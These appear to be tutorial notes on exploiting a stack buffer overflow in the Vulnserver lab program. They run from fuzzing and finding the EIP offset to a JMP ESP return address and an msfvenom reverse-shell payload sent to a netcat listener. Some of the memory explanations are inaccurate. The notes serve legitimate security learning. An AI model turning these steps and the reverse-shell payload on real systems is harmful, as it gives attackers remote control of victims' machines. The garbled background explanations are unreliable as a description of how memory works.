# Introduction to Exploit Development

## Buffer Overflows Explained

### Anatomy of Memory

The section of memory that we are trying to exploit is the section called
the **stack**, or the portion of memory closest to the kernel. Let's break
down the parts of the stack. The registers in the stack are:

- **ESP (Extended Stack Pointer)** *top*

- **Buffer Space**

- **EBP (Extended Base Pointer)** *bottom*

- **EIP (Extended Instruction Pointer)/Return Address**

Starts writing at top, then writes down throught the buffer space. Should
properly sanitize, where the buffer space fills and then stops at the EBP.
In an overflow, the characters fill ESP, the buffer space, and the EBP,
then continue writing into the EIP. Which really holds a pointer address,
that is an address that points to another set of instructions. Therefore
we can insert directions to our own malicious set of instructions. Control
the stack, control the pointer, get a shell. 

### Buffer overlow steps

1. Spiking

2. Fuzzing

3. Finding the offset (where we do break it)

4. Overwriting the EIP

5. Finding the Bad Characters

6. Finding the Right Module

7. Generating Shellcode

8. Root!

## Spiking

Spiking sends a series of values at a command on a machine to see if it is
even possible to "overflow the buffer". 

## Fuzzing

Somewhat like spiking, though we want to try to find exactly *where* the
failure occurs so we know where to insert our shellcode. The next video we
will figure out how to find exactly where the EIP is.

### Finding the Offset

To find where we overwrite the EIP we will use the tool
`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000`,
the switch of length 3000 because vulnserver crashed at around 2700 bytes.
This creates a circular bit of code that we will add to a script that I am
goingto call offset.py 

Then run this script against vuln server and get the value of the EIP when
the script causes the server to crash:

> 386F4337

Then we can run another tool called `pattern-offset`:

```

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337

``` 

which returns an exact match at offset 2003. Using this we can then
control the EIP. 

### Overwriting the EIP

Having found the offset we know that there are 2003 bytes before the EIP
and the EIP is exactly 4 bytes long. We will now try to overwrite those
4 bytes.

Start with vulnserver/immunity running, then edit the offset python
script (I am going to call it overwrite.py). This script with write "A"
(or 41) to everything before the EIP and then write "B" (or 42) to the
EIP. This is what ends up happening when you run the script, showing that
you have control of the EIP. 

Now comes housekeeping and using the EIP to send to malicious shellcode.

### Finding Bad Characters

We need to find which characters work well or not in shellcode. Google
'badchars', then manually copy the bad characters list from [bulb
security](https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/)
to the script then have it write the bad characters after the EIP. Be sure
to remove the value "\x00" from the list as this is a known bad character. Run the
script then in immunity debugger, right click on the ESP values and click
"Open in Dump" to view the hex dump. The values should move up in order
from "01" starting immeadiately after the EIP. If now, where there is an
out of place character, then you know the equivalent character is bad.

### Finding the Right Module

What is meant by "finding the right module" is finding a DLL inside of
a program that has no memory protections. There is a script called
[mona](https://github.com/corelan/mona) that is used with immunity
debugger to help automate this process. 

After installing mona.py in 'C:\Program Files (x86)\Immunity Inc\Immunity
Debugger\PyCommands\', run Immunity Debugger and search `! mona modules`
in the search bar at the bottom. This will bring up a window that shows
the protection settings of the various modules, we are looking for one
with all **False**s. We could use the first one, but we need one more
thing before we can use this.

The thing that we need still is the opcode equivalent to `JUMP`. To find
this out use `nasm_shell` located at
`/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`. By opcode,
we are looking for the hexcode equivalent of assembly language. In this
case, we are looking for the equivalent to `JMP ESP`, so run the ruby
module, then enter this at the prompt, which gives us `FFE4`. 

We can take this back to Immunity and go to the search bar and enter `!
mona find -s "i\xff\xe4" -m essfunc.dll`. The module was the first one we
found with our `! mona modules` search. We are looking for the Return
Addresses:

- 0x625011af

- 0x625011bb

- 0x625011c7

- 0x625011d3

- 0x625011df

- 0x625011eb

- 0x625011f7

- 0x62501203

- 0x62501205

Now we can insert this at the position of the EIP in the script and set
a break point in Immunity at this address so we can see if it ran or not.
We have to remember to use "little indian" formating, or reversed order of
the hex-byte pairs, along with "\x" before the number so that the program
knows that the number is a hex byte. Thus:

```

shellcode = "A" * 2003 + "\xaf\x11\x50\x62"

```

Then if everything works properly the EIP should show as `625011af` . Once
this is working, we can now find a malicious shellcode that we can add to
our script to get root.

### Generating Shellcode and Getting Root

The tool used to generate shellcode will be the ever trusty `msfvenom`. To
generate this we will run this command:

```

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.27 LPORT=4444

EXITFUNC=thread -f c -a x86 -b "\x00"

```

- `EXITFUNC` should make the exploit more stable.

- -f is the output format of the c

- -a designates the machine architecture

- -b tells the payload generator what bad characters to avoid.

We can then add this bytecode as a variable to our script and add it to
the shellcode variable after our JMP address. Additionally, we need to
provide "nops" or no operations, as padding between the EIP and the
overflow script. Here we will use `"\x90" * 32`. 

After finishing this script, we can open a NetCat listening port on the
port that we specified in payload script, make sure Vulnserver is running
and then fire the exploit.
